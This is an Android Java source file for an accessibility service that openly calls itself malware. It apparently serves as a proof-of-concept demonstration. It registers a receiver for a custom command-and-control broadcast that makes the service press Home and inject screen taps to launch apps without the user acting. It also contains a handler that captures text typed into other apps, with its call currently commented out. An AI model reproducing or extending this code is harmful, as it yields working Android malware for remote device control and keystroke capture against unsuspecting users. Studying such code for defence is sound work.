package social.deal.accessibilitymalware;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.graphics.Path;
import android.graphics.Point;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.widget.Toast;
import android.os.Handler;
import android.content.BroadcastReceiver;

public class MyAccessibilityService extends AccessibilityService {

    private static final String TAG = "MyAccessibilityService";
    private static final String CUSTOM_C2_ACTION = "cognizant.malware.ACTION_C2_TASK";

    private final BroadcastReceiver receiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (CUSTOM_C2_ACTION.equals(intent.getAction())) {
                doBadStuff();
            }
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();
        // Register the BroadcastReceiver
        IntentFilter filter = new IntentFilter(CUSTOM_C2_ACTION);
        registerReceiver(receiver, filter);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        // Unregister the BroadcastReceiver
        unregisterReceiver(receiver);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        //handleTextInputEvent(event);
        //openAppViaIntent("com.android.chrome");

    }

    @Override
    public void onInterrupt() {
        // Handle interrupt, if needed
    }

    private void handleTextInputEvent(AccessibilityEvent event){
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            CharSequence text = event.getText().toString();
            Log.d(TAG, "Fetched Text: "+ text);
            Toast.makeText(this, "Fetched Text: "+ text, Toast.LENGTH_LONG).show();
        }
    }

    private void performTap(float x, float y) {
        GestureDescription.Builder builder = new GestureDescription.Builder();
        Path path = new Path();
        path.moveTo(x, y);
        GestureDescription.StrokeDescription stroke = new GestureDescription.StrokeDescription(path, 0, 100);
        builder.addStroke(stroke);
        GestureDescription gesture = builder.build();

        dispatchGesture(gesture, new GestureResultCallback() {
            @Override
            public void onCompleted(GestureDescription gestureDescription) {
                super.onCompleted(gestureDescription);
                Log.d("MyAccessibilityService", "Gesture completed");
            }

            @Override
            public void onCancelled(GestureDescription gestureDescription) {
                super.onCancelled(gestureDescription);
                Log.d("MyAccessibilityService", "Gesture cancelled");
            }
        }, null);
    }



    public void doBadStuff() {
        Toast.makeText(getApplicationContext(), "Gonna do bad stuff now...", Toast.LENGTH_SHORT).show();

        performGlobalAction(GLOBAL_ACTION_HOME); // press Home Button

        new Handler().postDelayed(() -> {
            int x = getScreenSize().x / 2;
            int y = getScreenSize().y - 20;
            performTap(x,y);
        }, 1500);

        new Handler().postDelayed(() -> {
            int x = getScreenSize().x / 2;
            int y = getScreenSize().y / 2;
            performTap(x,y);
            Toast.makeText(getApplicationContext(), "Tapped the screen to open an app.\nCrazy.", Toast.LENGTH_SHORT).show();
        }, 3000);

    }

    private Point getScreenSize() {
        WindowManager windowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        DisplayMetrics displayMetrics = new DisplayMetrics();
        windowManager.getDefaultDisplay().getMetrics(displayMetrics);
        return new Point(displayMetrics.widthPixels, displayMetrics.heightPixels);
    }

    private void openAppViaIntent(String packageName){
        PackageManager pm = getPackageManager();
        Intent launchIntent = pm.getLaunchIntentForPackage(packageName);
        if (launchIntent != null) {
            launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);  // Ensure it starts in a new task
            startActivity(launchIntent);
        } else {
            Log.e(TAG, "App not found or unable to launch: " + packageName);
        }
    }
}

